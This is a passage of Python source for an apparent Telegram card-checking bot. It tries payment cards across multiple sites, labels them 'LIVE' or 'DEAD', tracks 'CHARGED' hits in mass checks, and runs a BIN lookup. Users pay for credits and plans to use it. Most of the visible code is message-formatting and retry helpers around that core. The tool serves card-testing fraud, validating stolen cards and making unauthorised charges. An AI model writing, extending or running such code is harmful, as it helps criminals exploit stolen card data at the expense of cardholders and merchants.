                f"({consec_timeouts * site_timeout:.0f}s wasted) — "
                f"aborting early"
            )
            return "DEAD", "timeout", price, currency

        # ── Pace: small delay between rounds to avoid flooding the API ─
        await asyncio.sleep(ROUND_DELAY)

    # ── All attempts exhausted ────────────────────────────────────────────────
    logging.warning(f"[SH] {card[:6]}** exhausted {max_sites} sites  last={last_resp!r}")
    if last_resp and _is_success_response(last_resp):
        return "LIVE", last_resp, price, currency
    return "DEAD", last_resp, price, currency

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MISC HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _te(eid: str, fb: str = "●") -> str:
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'

def _u16len(s: str) -> int:
    return len(s.encode("utf-16-le")) // 2

def html_to_entities(html: str):
    text     = ""
    entities = []
    stack    = []
    i        = 0
    n        = len(html)

    while i < n:
        ch = html[i]

        if ch == "<":
            j   = html.index(">", i)
            tag = html[i + 1 : j]

            if tag.startswith("/"):
                tag_name = tag[1:].strip().lower()
                for k in range(len(stack) - 1, -1, -1):
                    if stack[k]["name"] == tag_name:
                        entry  = stack.pop(k)
                        start  = entry["offset"]
                        end    = _u16len(text)
                        length = end - start
                        if length > 0:
                            if tag_name == "b":
                                entities.append(MessageEntity(
                                    type="bold", offset=start, length=length))
                            elif tag_name == "code":
                                entities.append(MessageEntity(
                                    type="code", offset=start, length=length))
                            elif tag_name == "a":
                                entities.append(MessageEntity(
                                    type="text_link", offset=start,
                                    length=length, url=entry.get("url", "")))
                        break
                i = j + 1

            elif tag.lower().startswith("tg-emoji"):
                m = re.search(r'emoji-id="([^"]+)"', tag)
                if m:
                    emoji_id  = m.group(1)
                    close_idx = html.index("</tg-emoji>", j + 1)
                    fallback  = html[j + 1 : close_idx]
                    offset    = _u16len(text)
                    text     += fallback
                    length    = _u16len(fallback)
                    if length > 0:
                        entities.append(MessageEntity(
                            type="custom_emoji", offset=offset,
                            length=length, custom_emoji_id=emoji_id))
                    i = close_idx + len("</tg-emoji>")
                else:
                    i = j + 1

            else:
                tag_name = tag.split()[0].lower() if tag else ""
                entry    = {"name": tag_name, "offset": _u16len(text)}
                if tag_name == "a":
                    m = re.search(r'href=["\']([^"\']+)["\']', tag)
                    if m:
                        entry["url"] = m.group(1)
                stack.append(entry)
                i = j + 1

        elif ch == "&":
            if   html[i:i+4] == "&lt;":  text += "<"; i += 4
            elif html[i:i+4] == "&gt;":  text += ">"; i += 4
            elif html[i:i+5] == "&amp;": text += "&"; i += 5
            elif html[i:i+6] == "&quot;":text += '"'; i += 6
            else:                        text += ch;  i += 1

        else:
            text += ch
            i    += 1

    return text, entities if entities else None

def _send_ents(html: str):
    return html_to_entities(html)

class MsgBuilder:
    __slots__ = ("_txt", "_ents")

    def __init__(self):
        self._txt  = ""
        self._ents = []

    @staticmethod
    def _u16(s: str) -> int:
        return len(s.encode("utf-16-le")) // 2

    def raw(self, s: str) -> "MsgBuilder":
        if s: self._txt += s
        return self

    def bold(self, s: str) -> "MsgBuilder":
        if not s: return self
        o = self._u16(self._txt); l = self._u16(s); self._txt += s
        if l: self._ents.append(MessageEntity(type="bold", offset=o, length=l))
        return self

    def code(self, s: str) -> "MsgBuilder":
        if not s: return self
        o = self._u16(self._txt); l = self._u16(s); self._txt += s
        if l: self._ents.append(MessageEntity(type="code", offset=o, length=l))
        return self

    def link(self, display: str, url: str) -> "MsgBuilder":
        if not display: return self
        o = self._u16(self._txt); l = self._u16(display); self._txt += display
        if l: self._ents.append(MessageEntity(type="text_link", offset=o, length=l, url=url))
        return self

    def emoji(self, eid: str, fb: str) -> "MsgBuilder":
        if not fb: return self
        o = self._u16(self._txt); l = self._u16(fb); self._txt += fb
        if l: self._ents.append(
            MessageEntity(type="custom_emoji", offset=o, length=l, custom_emoji_id=eid))
        return self

    def bold_emoji(self, eid: str, fb: str) -> "MsgBuilder":
        if not fb: return self
        o = self._u16(self._txt); l = self._u16(fb); self._txt += fb
        if l:
            self._ents.append(MessageEntity(type="bold", offset=o, length=l))
            self._ents.append(MessageEntity(
                type="custom_emoji", offset=o, length=l, custom_emoji_id=eid))
        return self

    def bold_link(self, display: str, url: str) -> "MsgBuilder":
        if not display: return self
        o = self._u16(self._txt); l = self._u16(display); self._txt += display
        if l:
            self._ents.append(MessageEntity(type="bold",      offset=o, length=l))
            self._ents.append(MessageEntity(type="text_link", offset=o, length=l, url=url))
        return self

    def italic(self, s: str) -> "MsgBuilder":
        if not s: return self
        o = self._u16(self._txt); l = self._u16(s); self._txt += s
        if l: self._ents.append(MessageEntity(type="italic", offset=o, length=l))
        return self

    def mention(self, username: str) -> "MsgBuilder":
        if not username: return self
        o = self._u16(self._txt); l = self._u16(username); self._txt += username
        if l: self._ents.append(MessageEntity(type="mention", offset=o, length=l))
        return self

    def nl(self, n: int = 1) -> "MsgBuilder":
        self._txt += "\n" * n
        return self

    def build(self):
        return self._txt, self._ents if self._ents else None

def _uname(user) -> str:
    return getattr(user, "first_name", None) or "User"

def _uurl(user) -> str:
    if getattr(user, "username", None):
        return f"https://t.me/{user.username}"
    return f"tg://user?id={user.id}"

async def _get_sticker_fid(bot, emoji_id: str):
    return None

async def _send_sticker(bot, chat_id, emoji_id: str):
    pass

async def _send_as_media(bot, chat_id, emoji_id: str, caption: str,
                          parse_mode: str = "HTML", reply_markup=None,
                          disable_notification: bool = False,
                          reply_to_message_id: int = None):
    """Send a hit notification with a premium custom emoji sticker header.

    Builds the full HTML, then converts it with html_to_entities() so that
    custom_emoji MessageEntity objects are injected DIRECTLY — this guarantees
    animated premium stickers show for ALL users regardless of whether the bot
    account has Telegram Premium.  parse_mode="HTML" alone often falls back to
    the plain-text fallback glyph instead of the animated emoji.
    """
    try:
        if emoji_id:
            full_html = (
                f'<b><tg-emoji emoji-id="{emoji_id}">⭐</tg-emoji></b>\n'
                f'{caption}'
            )
        else:
            full_html = caption

        plain_text, ents = html_to_entities(full_html)

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        # RETRY LOGIC — Fix for skipped CHARGED cards during mass check.
        # When many hits happen at once, Telegram rate-limits the bot (429).
        # Without retrying, the message is dropped and the user never gets it.
        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        max_retries = 5
        for attempt in range(max_retries):
            try:
                await bot.send_message(
                    chat_id=chat_id,
                    text=plain_text,
                    entities=ents if ents else None,
                    reply_markup=reply_markup,
                    disable_web_page_preview=True,
                    disable_notification=disable_notification,
                    reply_to_message_id=reply_to_message_id,
                )
                return  # Success! Exit the function.
            except RetryAfter as exc:
                wait_time = float(getattr(exc, 'retry_after', 2.0))
                logging.warning(f"[MEDIA] Rate limited by Telegram. Sleeping for {wait_time}s before retry...")
                await asyncio.sleep(wait_time)
            except (NetworkError, TimedOut) as exc:
                logging.warning(f"[MEDIA] Network error on attempt {attempt + 1}/{max_retries}: {exc}")
                await asyncio.sleep(2)
            except BadRequest as exc:
                if "chat not found" in str(exc).lower() or "blocked by the user" in str(exc).lower():
                    logging.warning(f"[MEDIA] Cannot send to {chat_id}: {exc}")
                    return  # User blocked the bot, no point retrying
                if attempt < max_retries - 1:
                    logging.warning(f"[MEDIA] BadRequest on attempt {attempt + 1}: {exc}")
                    await asyncio.sleep(1)
                else:
                    raise
        logging.error(f"[MEDIA] Failed to send message to {chat_id} after {max_retries} retries.")
    except Exception as exc:
        logging.warning(f"[MEDIA] send_message to {chat_id} failed: {exc}")

def _plan_eid(plan: str) -> str:
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in (plan or ""))
    if norm in PLAN_EMOJIS:
        return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm:
            return v
    return PRO_EMOJI_ID

def _user_link(user) -> str:
    name = escape(getattr(user, "first_name", None) or "User")
    if getattr(user, "username", None):
        return f'<a href="https://t.me/{user.username}">{name}</a>'
    return f'<a href="tg://user?id={user.id}">{name}</a>'

def _fmt_time(s: float) -> str:
    s = int(s)
    return f"{s//60}m {s%60}s" if s >= 60 else f"{s}s"

def _fmt_price(price: str, currency: str) -> str:
    try:
        v = float(re.sub(r"[^\d.]", "", price or ""))
        if v > 0:
            return f"{v:.2f} {escape(currency)}"
    except Exception:
        pass
    return "0.00 USD"

def _is_premium(ud: dict, uid: int) -> bool:
    return (uid == OWNER_ID or ud.get("premium", False)
            or ud.get("plan") not in (None, "TRIAL"))

def _get_ud(uid: int, ctx) -> dict:
    ud_store = ctx.bot_data.setdefault("user_data", {})
    key      = str(uid)
    if key not in ud_store:
        from datetime import datetime as _dt
        ud_store[key] = {
            "name": "User", "first_name": "User", "last_name": "", "username": "",
            "language_code": "en",
            "joined":      _dt.now().strftime("%Y-%m-%d %H:%M"),
            "last_active": _dt.now().strftime("%Y-%m-%d %H:%M"),
            "credits": 150, "plan": "TRIAL", "expires": 0, "pre_premium_credits": 0,
            "total_refs": 0, "total_checks": 0, "approved_checks": 0,
            "declined_checks": 0, "last_gate": "N/A", "last_card": "N/A",
            "codes_redeemed": 0, "keys_redeemed": 0, "banned": False,
            "total_charged": 0,
        }
    return ud_store[key]

def _sid() -> str:
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BIN LOOKUP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
COUNTRY_FLAGS = {
    "US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷",
    "IN":"🇮🇳","BR":"🇧🇷","MX":"🇲🇽","JP":"🇯🇵","CN":"🇨🇳","RU":"🇷🇺",
    "IT":"🇮🇹","ES":"🇪🇸","NL":"🇳🇱","SE":"🇸🇪","NG":"🇳🇬","ZA":"🇿🇦",
    "EG":"🇪🇬","PK":"🇵🇰","SG":"🇸🇬","MY":"🇲🇾","ID":"🇮🇩","TH":"🇹🇭",
    "PH":"🇵🇭","VN":"🇻🇳","AE":"🇦🇪","SA":"🇸🇦","TR":"🇹🇷","PL":"🇵🇱",
    "UA":"🇺🇦","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱","NZ":"🇳🇿","HK":"🇭🇰",
    "TW":"🇹🇼","KR":"🇰
